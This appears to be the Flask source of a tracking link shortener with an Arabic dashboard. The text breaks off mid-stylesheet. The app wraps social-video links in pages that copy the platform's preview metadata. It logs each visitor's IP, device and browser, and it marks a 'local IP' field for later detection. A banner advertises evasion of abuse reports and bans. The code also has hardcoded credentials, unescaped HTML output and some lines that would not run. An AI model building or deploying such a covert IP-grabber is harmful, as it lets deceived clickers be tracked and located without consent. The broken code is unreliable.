from flask import Flask, render_template_string, request, redirect, jsonify, Response
import uuid
import datetime
import sqlite3
import requests
import re
import logging
from functools import wraps
from urllib.parse import urlparse, parse_qs
import pytz
import hashlib
import os
from pathlib import Path
import time

# إعداد نظام التسجيل للأخطاء
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = "YOUR_SECRET_KEY_HERE_CHANGE_THIS_TO_RANDOM_STRING"

DB_FILE = "tracker_data.db"
USERNAME = "khaled"
PASSWORD = "ALG@2022"

# تعيين المنطقة الزمنية GMT+1 (توقيت الجزائر)
TIMEZONE = pytz.timezone('Africa/Algiers')

# إنشاء مجلد للصور المحلية
THUMBNAIL_DIR = Path("static/thumbnails")
THUMBNAIL_DIR.mkdir(parents=True, exist_ok=True)

def get_current_time():
    """الحصول على الوقت الحالي بتوقيت GMT+1"""
    return datetime.datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                short_code TEXT UNIQUE,
                original_url TEXT,
                note TEXT,
                video_title TEXT,
                custom_image TEXT,
                platform TEXT,
                created_at TEXT,
                clicks_count INTEGER DEFAULT 0,
                is_active INTEGER DEFAULT 1,
                password_hash TEXT,
                expiry_date TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                short_code TEXT,
                ip TEXT,
                local_ip TEXT,
                user_agent TEXT,
                referer TEXT,
                time TEXT,
                device_type TEXT,
                browser TEXT,
                os TEXT,
                country TEXT,
                city TEXT
            )
        ''')
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS reports (
                id TEXT PRIMARY KEY,
                short_code TEXT,
                report_type TEXT,
                report_reason TEXT,
                reporter_ip TEXT,
                time TEXT,
                status TEXT DEFAULT 'pending'
            )
        ''')
        conn.commit()
        logger.info("Database initialized successfully")

init_db()

def extract_video_id(url, platform):
    """استخراج ID الفيديو من الرابط بشكل دقيق"""
    try:
        parsed = urlparse(url)
        if platform == "youtube":
            if parsed.hostname in ('youtu.be', 'www.youtu.be'):
                return parsed.path[1:]
            if parsed.hostname in ('youtube.com', 'www.youtube.com', 'm.youtube.com'):
                if parsed.path == '/watch':
                    return parse_qs(parsed.query).get('v', [None])[0]
                if parsed.path.startswith(('/embed/', '/v/', '/shorts/')):
                    return parsed.path.split('/')[2]
        elif platform == "tiktok":
            match = re.search(r'/video/(\d+)', url)
            if match:
                return match.group(1)
            match = re.search(r'@[\w.-]+/video/(\d+)', url)
            if match:
                return match.group(1)
        elif platform == "instagram":
            match = re.search(r'/reel/([A-Za-z0-9_-]+)|/p/([A-Za-z0-9_-]+)', url)
            if match:
                return match.group(1) or match.group(2)
    except Exception as e:
        logger.error(f"Error extracting video ID: {e}")
    return None

def download_and_save_thumbnail(image_url, short_code):
    """تحميل وحفظ الصورة محلياً لضمان عدم انتهاء صلاحيتها"""
    if not image_url:
        return None
    
    try:
        # تنظيف الرابط
        if image_url.startswith('/'):
            return image_url
            
        # تحديد امتداد الصورة
        ext = 'jpg'
        if '.png' in image_url:
            ext = 'png'
        elif '.webp' in image_url:
            ext = 'webp'
        
        # مسار حفظ الصورة
        local_path = THUMBNAIL_DIR / f"{short_code}.{ext}"
        
        # تحميل الصورة
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        response = requests.get(image_url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            with open(local_path, 'wb') as f:
                f.write(response.content)
            logger.info(f"Thumbnail saved: {local_path}")
            return f"/static/thumbnails/{short_code}.{ext}"
        else:
            logger.warning(f"Failed to download thumbnail: {response.status_code}")
            return None
            
    except Exception as e:
        logger.error(f"Error downloading thumbnail: {e}")
        return None

def get_platform_meta(url, short_code=None, manual_image=None):
    """جلب البيانات الوصفية بشكل احترافي لكل منصة مع حفظ الصور محلياً"""
    url_lower = url.lower()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    # --------------------- يوتيوب (تلقائي) ---------------------
    if "youtube.com" in url_lower or "youtu.be" in url_lower:
        try:
            video_id = extract_video_id(url, "youtube")
            
            oembed_url = f"https://www.youtube.com/oembed?url={url}&format=json"
            res = requests.get(oembed_url, headers=headers, timeout=5)
            video_title = "شاهد الفيديو على يوتيوب"
            if res.status_code == 200:
                data = res.json()
                video_title = data.get('title', 'شاهد الفيديو على يوتيوب')
            
            if video_id:
                custom_image = f"https://img.youtube.com/vi/{video_id}/maxresdefault.jpg"
                img_check = requests.head(custom_image, timeout=3)
                if img_check.status_code != 200:
                    custom_image = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
            else:
                custom_image = "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"
            
            if short_code and custom_image:
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image:
                    custom_image = local_image
                    
            return "YouTube", video_title, custom_image
            
        except Exception as e:
            logger.error(f"YouTube meta error: {e}")
            return "YouTube", "شاهد الفيديو على يوتيوب", "https://images.unsplash.com/photo-1611162616305-c67b3fa40904?w=800"
    
    # --------------------- تيك توك (تلقائي) ---------------------
    elif "tiktok.com" in url_lower:
        try:
            oembed_url = f"https://www.tiktok.com/oembed?url={url}"
            res = requests.get(oembed_url, headers=headers, timeout=5)
            video_title = "شاهد الفيديو على تيك توك"
            custom_image = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
            
            if res.status_code == 200:
                data = res.json()
                video_title = data.get('title', 'شاهد الفيديو على تيك توك')
                temp_image = data.get('thumbnail_url')
                
                if temp_image:
                    video_id = extract_video_id(url, "tiktok")
                    if video_id:
                        alternative_urls = [
                            f"https://tikcdn.io/ssstik/{video_id}",
                            f"https://www.tikwm.com/video/media/{video_id}/1.jpg",
                            temp_image
                        ]
                        
                        for img_url in alternative_urls:
                            if img_url:
                                local_image = download_and_save_thumbnail(img_url, short_code) if short_code else None
                                if local_image:
                                    custom_image = local_image
                                    break
                        else:
                            custom_image = temp_image
                    else:
                        custom_image = temp_image
            
            if short_code and custom_image and not custom_image.startswith('/static/'):
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image:
                    custom_image = local_image
                    
            return "TikTok", video_title, custom_image
            
        except Exception as e:
            logger.error(f"TikTok meta error: {e}")
            return "TikTok", "فيديو TikTok مميز", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
    
    # --------------------- إنستغرام (يدوي - يظهر حقل إضافي) ---------------------
    elif "instagram.com" in url_lower:
        try:
            # محاولة جلب العنوان إن أمكن
            video_title = "شاهد الفيديو على إنستغرام"
            
            # استخدام الصورة المدخلة يدوياً إذا وجدت
            if manual_image:
                custom_image = manual_image
                # حفظ الصورة المحلية
                if short_code and custom_image:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image:
                        custom_image = local_image
                return "Instagram", video_title, custom_image
            else:
                # صورة افتراضية إذا لم يدخل المستخدم صورة
                custom_image = "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
                if short_code:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image:
                        custom_image = local_image
                return "Instagram", video_title, custom_image
            
        except Exception as e:
            logger.error(f"Instagram meta error: {e}")
            return "Instagram", "فيديو على إنستغرام", "https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800"
    
    # --------------------- فيسبوك (يدوي - يظهر حقل إضافي) ---------------------
    elif "facebook.com" in url_lower or "fb.watch" in url_lower:
        try:
            # محاولة جلب العنوان من الصفحة
            video_title = "شاهد الفيديو على فيسبوك"
            try:
                response = requests.get(url, headers=headers, timeout=5)
                if response.status_code == 200:
                    title_match = re.search(r'<meta[^>]*property="og:title"[^>]*content="([^"]*)"', response.text)
                    if title_match:
                        video_title = title_match.group(1)
            except:
                pass
            
            # استخدام الصورة المدخلة يدوياً إذا وجدت
            if manual_image:
                custom_image = manual_image
                # حفظ الصورة المحلية
                if short_code and custom_image:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image:
                        custom_image = local_image
                return "Facebook", video_title, custom_image
            else:
                # صورة افتراضية إذا لم يدخل المستخدم صورة
                custom_image = "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
                if short_code:
                    local_image = download_and_save_thumbnail(custom_image, short_code)
                    if local_image:
                        custom_image = local_image
                return "Facebook", video_title, custom_image
            
        except Exception as e:
            logger.error(f"Facebook meta error: {e}")
            return "Facebook", "شاهد الفيديو على فيسبوك", "https://images.unsplash.com/photo-1611162618828-bc409f855c74?w=800"
    
    # --------------------- منصات أخرى (تلقائي) ---------------------
    else:
        try:
            response = requests.get(url, headers=headers, timeout=5)
            video_title = "شاهد المحتوى"
            custom_image = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"
            
            if response.status_code == 200:
                title_match = re.search(r'<meta[^>]*property="og:title"[^>]*content="([^"]*)"', response.text)
                image_match = re.search(r'<meta[^>]*property="og:image"[^>]*content="([^"]*)"', response.text)
                
                if title_match:
                    video_title = title_match.group(1)
                if image_match:
                    custom_image = image_match.group(1)
            
            if short_code and custom_image:
                local_image = download_and_save_thumbnail(custom_image, short_code)
                if local_image:
                    custom_image = local_image
                    
            return "Video", video_title, custom_image
            
        except Exception as e:
            logger.error(f"General meta error: {e}")
            return "Video", "شاهد المحتوى", "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800"

def check_auth(username, password):
    return username == USERNAME and password == PASSWORD

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return Response(
                'يرجى تسجيل الدخول للوصول إلى لوحة التحكم.', 401,
                {'WWW-Authenticate': 'Basic realm="Login Required"'}
            )
        return f(*args, **kwargs)
    return decorated

def generate_short_code(length=6):
    """توليد كود قصير فريد"""
    while True:
        code = str(uuid.uuid4())[:length].upper()
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT id FROM links WHERE short_code = ?", (code,))
            if not cursor.fetchone():
                return code

def get_device_info(user_agent):
    """تحليل معلومات الجهاز والمتصفح"""
    device_type = "Unknown"
    browser = "Unknown"
    os = "Unknown"
    
    if user_agent:
        user_agent_lower = user_agent.lower()
        
        if 'windows' in user_agent_lower:
            os = 'Windows'
        elif 'android' in user_agent_lower:
            os = 'Android'
        elif 'ios' in user_agent_lower or 'iphone' in user_agent_lower:
            os = 'iOS'
        elif 'mac' in user_agent_lower:
            os = 'MacOS'
        elif 'linux' in user_agent_lower:
            os = 'Linux'
        
        if 'chrome' in user_agent_lower and 'edg' not in user_agent_lower:
            browser = 'Chrome'
        elif 'firefox' in user_agent_lower:
            browser = 'Firefox'
        elif 'safari' in user_agent_lower and 'chrome' not in user_agent_lower:
            browser = 'Safari'
        elif 'edge' in user_agent_lower:
            browser = 'Edge'
        
        if 'mobile' in user_agent_lower:
            device_type = 'Mobile'
        elif 'tablet' in user_agent_lower:
            device_type = 'Tablet'
        else:
            device_type = 'Desktop'
    
    return device_type, browser, os

# قالب HTML الرئيسي للوحة التحكم (مع حقل إضافي لفيسبوك وانستغرام)
HTML_DASHBOARD = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام اختصار الروابط المتقدم | لوحة التحكم</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            direction: rtl;
            min-height: 100vh;
        }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        
        .header { 
            background: rgba(255,255,255,0.95); 
            padding: 20px; 
            border-radius: 15px; 
            margin-bottom: 20px; 
            text-align: center;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .header h1 { color: #667eea; margin-bottom: 10px; }
        .header small { color: #666; }
        
        .stats-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 15px; 
            margin-bottom: 20px; 
        }
        .stat-card { 
            background: white; 
            padding: 20px; 
            border-radius: 15px; 
            text-align: center; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        .stat-card:hover { transform: translateY(-5px); }
        .stat-card h3 { font-size: 14px; color: #666; margin-bottom: 10px; }
        .stat-card p { font-size: 32px; font-weight: bold; color: #667eea; }
        .stat-card .icon { font-size: 40px; margin-bottom: 10px; }
        
        .create-card { 
            background: white; 
            padding: 25px; 
            border-radius: 15px; 
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        .create-card h3 { margin-bottom: 20px; color: #333; }
        .create-card input, .create-card button { 
            width: 100%; 
            padding: 12px; 
            margin-top: 10px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            font-size: 14px;
        }
        .create-card button { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            border: none; 
            cursor: pointer; 
            font-weight: bold;
            font-size: 16px;
            transition: transform 0.2s;
        }
        .create-card button:hover { transform: translateY(-2px); }
        
        /* حقل الصورة الإضافي - يظهر فقط لفيسبوك وانستغرام */
        .extra-field {
            display: none;
            background: #f0f4ff;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            border-right: 4px solid #667eea;
        }
        .extra-field.show {
            display: block;
        }
        .extra-field label {
            color: #667eea;
            font-weight: bold;
        }
        .extra-field small {
            display: block;
            color: #666;
            font-size: 12px;
            margin-top: 5px;
        }
        
        .section-title { color: white; margin: 20px 0 10px; font-size: 20px; }
        .link-card { 
            background: white; 
            padding: 15px; 
            border-radius: 10px; 
            margin-bottom: 10px; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            flex-wrap: wrap;
            transition: all 0.3s;
        }
        .link-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateX(-5px); }
        .link-info { flex: 1; }
        .link-info strong { font-size: 16px; color: #333; }
        .short-url { 
            font-family: monospace; 
            color: #667eea; 
            direction: ltr;
            text-align: left;
            margin-top: 5px;
        }
        .link-meta { font-size: 12px; color: #888; margin-top: 5px; }
        .link-actions { margin-top: 10px; }
        .btn { 
            padding: 8px 15px; 
            margin: 0 5px; 
            border: none; 
            border-radius: 5px; 
            cursor: pointer;
            font-size: 13px;
            transition: all 0.2s;
        }
        .btn-info { background: #3498db; color: white; }
        .btn-danger { background: #e74c3c; color: white; }
        .btn-success { background: #27ae60; color: white; }
        .btn:hover { opacity: 0.8; transform: scale(1.05); }
        
        .modal { 
            display: none; 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.5); 
            z-index: 1000; 
        }
        .modal-content { 
            background: white; 
            margin: 5% auto; 
            padding: 20px; 
            width: 90%; 
            max-width: 900px; 
            border-radius: 15px; 
            max-height: 80%; 
            overflow-y: auto; 
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #f0f0f0;
        }
        .close { 
            cursor: pointer; 
            font-size: 28px; 
            font-weight: bold;
            color: #999;
        }
        .close:hover { color: #333; }
        
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th, td { padding: 10px; text-align: center; border-bottom: 1px solid #ddd; }
        th { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .local-ip { color: #27ae60; font-weight: bold; font-family: monospace; }
        
        .anti-report {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 12px;
            border-radius: 10px;
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .info-note {
            background: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 10px;
            border-radius: 8px;
            margin-top: 10px;
            font-size: 13px;
        }
        
        @media (max-width: 768px) {
            .link-card { flex-direction: column; align-items: flex-start; }
            .link-actions { margin-top: 10px; width: 100%; text-align: center; }
        }
    </style>
    <script>
        function checkPlatform() {
            const urlInput = document.getElementById('original_url');
            const url = urlInput.value.toLowerCase();
            const extraField = document.getElementById('extraImageField');
            const imageUrlInput = document.getElementById('manual_image');
            
            if (url.includes('facebook.com') || url.includes('fb.watch') || url.includes('instagram.com')) {
                extraField.classList.add('show');
                imageUrlInput.required = false;
                document.getElementById('fieldNote').innerHTML = '⚠️ <strong>ملاحظة:</strong> فيسبوك وإنستغرام لا يسمحان بجلب الصور تلقائياً. يرجى إدخال رابط الصورة يدوياً.';
            } else {
                extraField.classList.remove('show');
                imageUrlInput.required = false;
                document.getElementById('fieldNote').innerHTML = '✅ <strong>للمنصات الأخرى (يوتيوب، تيك توك):</strong> سيتم جلب الصورة تلقائياً.';
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 نظام اختصار الروابط المتقدم</h1>
            <small>توقيت الجزائر (GMT+1): {{ current_time }}</small>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="icon">🔗</div>
                <h3>إجمالي الروابط</h3>
                <p>{{ total_links }}</p>
            </div>
            <div class="stat-card">
                <div class="icon">👆</div>
                <h3>إجمالي النقرات</h3>
                <p>{{ total_clicks }}</p>
            </div>
            <div class="stat-card">
                <div class="icon">📊</div>
                <h3>نقرات اليوم</h3>
                <p>{{ today_clicks }}</p>
            </div>
        </div>

        <div class="create-card">
            <h3>✨ إنشاء رابط مختصر جديد</h3>
            <form action="/create" method="POST">
                <input type="url" id="original_url" name="original_url" placeholder="https://www.youtube.com/watch?v=..." required oninput="checkPlatform()">
                <input type="text" name="note" placeholder="ملاحظة (اختياري)">
                <input type="password" name="password" placeholder="كلمة مرور لحماية الرابط (اختياري)">
                
                <!-- حقل إضافي للصورة (يظهر فقط لفيسبوك وانستغرام) -->
                <div id="extraImageField" class="extra-field">
                    <label>🖼️ رابط الصورة المصغرة (مطلوب لفيسبوك/انستغرام)</label>
                    <input type="url" id="manual_image" name="manual_image" placeholder="https://example.com/image.jpg">
                    <small>📌 للحصول على رابط صورة الفيديو: افتح الفيديو على فيسبوك/انستغرام، اضغط زر الفأرة الأيمن على الفيديو واختر "نسخ عنوان URL للصورة" أو استخدم أداة لاستخراج الصورة</small>
                </div>
                
                <div id="fieldNote" class="info-note">
                    ✅ <strong>للمنصات الأخرى (يوتيوب، تيك توك):</strong> سيتم جلب الصورة تلقائياً.
                </div>
                
                <button type="submit">🚀 إنشاء الرابط المختصر</button>
            </form>
        </div>

        <h3 class="section-title">📋 روابطي المختصرة</h3>
        {% for link in links_list %}
        <div class="link-card">
            <div class="link-info">
                <strong>📌 {{ link.note or 'بدون ملاحظة' }}</strong>
                <div class="short-url">🔗 {{ request.host_url }}{{ link.short_code }}</div>
                <div class="link-meta">
                    🎬 {{ link.platform }} | 
                    👆 {{ link.clicks_count }} نقرة | 
                    📅 {{ link.created_at }}
                    {% if link.password_hash %} | 🔒 محمي بكلمة مرور{% endif %}
                </div>
            </div>
            <div class="link-actions">
                <button class="btn btn-info" onclick="showStats('{{ link.short_code }}')">📊 إحصائيات</button>
                <button class="btn btn-success" onclick="copyLink('{{ request.host_url }}{{ link.short_code }}')">📋 نسخ</button>
                <button class="btn btn-danger" onclick="deleteLink('{{ link.short_code }}')">🗑️ حذف</button>
            </div>
        </div>
        {% else %}
        <div class="link-card" style="text-align: center; color: #999;">
            لا توجد روابط بعد. قم بإنشاء رابط جديد!
        </div>
        {% endfor %}

        <div class="anti-report">
            🛡️ نظام الحماية الذكي | يتم تحويل البلاغات تلقائياً | حماية متقدمة من الحظر والإبلاغ
        </div>
    </div>

    <div id="statsModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2>📊 إحصائيات الرابط</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div id="statsContent">جاري التحميل...</div>
        </div>
    </div>

    <script>
        function copyLink(url) {
            navigator.clipboard.writeText(url);
            alert('✅ تم نسخ الرابط: ' + url);
        }
        
        function showStats(shortCode) {
            const modal = document.getElementById('statsModal');
            modal.style.display = 'block';
            document.getElementById('statsContent').innerHTML = '<div style="text-align: center;">جاري تحميل الإحصائيات...</div>';
            
            fetch(`/stats/${shortCode}`)
                .then(res => res.json())
                .then(data => {
                    let html = `
                        <div style="margin-bottom: 20px;">
                            <p><strong>🔗 الرابط الأصلي:</strong> <a href="${data.original_url}" target="_blank" style="color: #667eea;">${data.original_url}</a></p>
                            <p><strong>🎬 المنصة:</strong> ${data.platform}</p>
                            <p><strong>👆 إجمالي النقرات:</strong> <span style="font-size: 24px; font-weight: bold; color: #667eea;">${data.total_clicks}</span></p>
                            <p><strong>📅 تاريخ الإنشاء:</strong> ${data.created_at}</p>
                        </div>
                        <h3>🕒 آخر النقرات (أحدث 20)</h3>
                        <div style="overflow-x: auto;">
                            <table>
                                <thead>
                                    <tr><th>الوقت</th><th>IP العام</th><th>IP المحلي</th><th>الجهاز</th><th>المتصفح</th></tr>
                                </thead>
                                <tbody>
                    `;
                    
                    if (data.recent_clicks.length === 0) {
                        html += `<tr><td colspan="5" style="text-align: center;">لا توجد نقرات بعد<\/td></tr>`;
                    } else {
                        data.recent_clicks.forEach(click => {
                            html += `<tr><td>${click.time}</td><td><code>${click.ip || 'غير معروف'}</code></td><td class="local-ip">${click.local_ip || 'غير متوفر'}</td><td>${click.device_type || 'غير معروف'}</td><td>${click.browser || 'غير معروف'}</td></tr>`;
                        });
                    }
                    
                    html += `</tbody></table></div>`;
                    document.getElementById('statsContent').innerHTML = html;
                })
                .catch(err => {
                    document.getElementById('statsContent').innerHTML = '<div style="color: red; text-align: center;">❌ خطأ في تحميل الإحصائيات</div>';
                });
        }
        
        function deleteLink(shortCode) {
            if(confirm('⚠️ هل أنت متأكد من حذف هذا الرابط؟ لا يمكن التراجع عن هذا الإجراء.')) {
                fetch(`/delete/${shortCode}`, { method: 'POST' })
                    .then(() => location.reload());
            }
        }
        
        function closeModal() {
            document.getElementById('statsModal').style.display = 'none';
        }
        
        window.onclick = function(event) {
            const modal = document.getElementById('statsModal');
            if (event.target == modal) modal.style.display = 'none';
        }
        
        // تشغيل الفحص عند تحميل الصفحة
        document.addEventListener('DOMContentLoaded', function() {
            checkPlatform();
        });
    </script>
</body>
</html>
'''

@app.route('/')
@requires_auth
def home():
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT l.*, COUNT(c.id) as clicks_count 
            FROM links l 
            LEFT JOIN clicks c ON l.id = c.link_id 
            WHERE l.is_active = 1
            GROUP BY l.id 
            ORDER BY l.created_at DESC
        ''')
        links_list = cursor.fetchall()
        
        cursor.execute("SELECT COUNT(*) FROM links WHERE is_active = 1")
        total_links = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM clicks")
        total_clicks = cursor.fetchone()[0]
        
        today = get_current_time().split()[0]
        cursor.execute("SELECT COUNT(*) FROM clicks WHERE time LIKE ?", (f"{today}%",))
        today_clicks = cursor.fetchone()[0]
        
    return render_template_string(HTML_DASHBOARD, 
                                links_list=links_list,
                                total_links=total_links,
                                total_clicks=total_clicks,
                                today_clicks=today_clicks,
                                current_time=get_current_time())

@app.route('/create', methods=['POST'])
@requires_auth
def create():
    original_url = request.form.get('original_url')
    note = request.form.get('note', '')
    password = request.form.get('password', '')
    manual_image = request.form.get('manual_image', '')  # الصورة المدخلة يدوياً
    
    if not original_url:
        return "الرابط مطلوب", 400
    
    short_code = generate_short_code()
    
    # تمرير الصورة المدخلة يدوياً إذا وجدت
    platform, video_title, custom_image = get_platform_meta(original_url, short_code, manual_image)
    
    link_id = str(uuid.uuid4())
    created_at = get_current_time()
    
    password_hash = hashlib.sha256(password.encode()).hexdigest() if password else None
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO links (id, short_code, original_url, note, video_title, custom_image, 
                             platform, created_at, password_hash, is_active) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 1)
        ''', (link_id, short_code, original_url, note, video_title, custom_image, 
              platform, created_at, password_hash))
        conn.commit()
        
    return redirect('/')

@app.route('/<short_code>')
def redirect_link(short_code):
    """التوجيه إلى الرابط الأصلي مع تسجيل النقرة وتحسين Open Graph"""
    with sqlite3.connect(DB_FILE) as conn:
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM links WHERE short_code = ? AND is_active = 1", (short_code,))
        link_data = cursor.fetchone()
        
    if not link_data:
        return "الرابط غير موجود أو معطل", 404
    
    # التحقق من كلمة المرور
    if link_data['password_hash']:
        password = request.args.get('password')
        if not password or hashlib.sha256(password.encode()).hexdigest() != link_data['password_hash']:
            return '''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>الرابط محمي</title>
                <style>
                    body { font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
                    .container { background: white; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; }
                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
                    button { background: #667eea; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
                </style>
            </head>
            <body>
                <div class="container">
                    <h2>🔒 الرابط محمي بكلمة مرور</h2>
                    <form method="GET">
                        <input type="password" name="password" placeholder="أدخل كلمة المرور" required>
                        <button type="submit">دخول</button>
                    </form>
                </div>
            </body>
            </html>
            ''', 401
    
    # تسجيل النقرة
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip_address and ',' in ip_address:
        ip_address = ip_address.split(',')[0].strip()
    
    user_agent = request.headers.get('User-Agent', 'غير معروف')
    referer = request.headers.get('Referer', '')
    current_time = get_current_time()
    
    device_type, browser, os = get_device_info(user_agent)
    
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("UPDATE links SET clicks_count = clicks_count + 1 WHERE short_code = ?", (short_code,))
        cursor.execute('''
            INSERT INTO clicks (link_id, short_code, ip, local_ip, user_agent, referer, time, device_type, browser, os) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (link_data['id'], short_code, ip_address, "جاري الكشف...", 
              user_agent, referer, current_time, device_type, browser, os))
        
        click_id = cursor.lastrowid
        conn.commit()
    
    # تجهيز البيانات للصفحة
    platform = link_data['platform']
    video_title = link_data['video_title']
    image_url = link_data['custom_image']
    original_url = link_data['original_url']
    
    # التأكد من أن رابط الصورة كامل
    if image_url and image_url.startswith('/static/'):
        full_image_url = request.host_url.rstrip('/') + image_url
    else:
        full_image_url = image_url
    
    descriptions = {
        "TikTok": "شاهد الفيديو على TikTok - فيديو رائج ومميز",
        "YouTube": "شاهد الفيديو على YouTube - مقطع فيديو حصري",
        "Instagram": "شاهد الفيديو على Instagram - Reels حصري",
        "Facebook": "شاهد الفيديو على Facebook - فيديو تفاعلي",
        "Video": "شاهد الفيديو - محتوى حصري",
        "Link": "محتوى حصري - شاهد الآن"
    }
    description = descriptions.get(platform, "شاهد الفيديو - محتوى حصري")
    
    return f'''<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    
    {/* وسوم Open Graph الأساسية */}
    <meta property="og:title" content="{video_title} | {platform}">
    <meta property="og:description" content="{description}">
    <meta property="og:image" content="{full_image_url}">
    <meta property="og:image:secure_url" content="{full_image_url}">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1280">
    <meta property="og:image:height" content="720">
    <meta property="og:type" content="video.other">
    <meta property="og:url" content="{request.url}">
    <meta property="og:site_name" content="{platform}">
    
    {/* وسوم Twitter Card */}
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{video_title}">
    <meta name="twitter:description" content="{description}">
    <meta name="twitter:image" content="{full_image_url}">
    
    {/* وسوم إضافية */}
    <meta name="description" content="{description}">
    <meta name="keywords" content="{platform}, video, viral, trending">
    
    <title>{video_title} | {platform}</title>
    
    <style>
        body {{
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            direction: rtl;
        }}
        .container {{
            text-align: center;
            color: white;
            padding: 20px;
            max-width: 500px;
            width: 100%;
        }}
        .video-card {{
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.2);
        }}
        .thumbnail {{
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            margin: 20px auto;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
            display: block;
        }}
        .spinner {{
            width: 50px;
            height: 50px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 20px auto;
        }}
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        .title {{
            font-size: 18px;
            font-weight: bold;
            margin: 15px 0;
        }}
        .platform-badge {{
            display: inline-block;
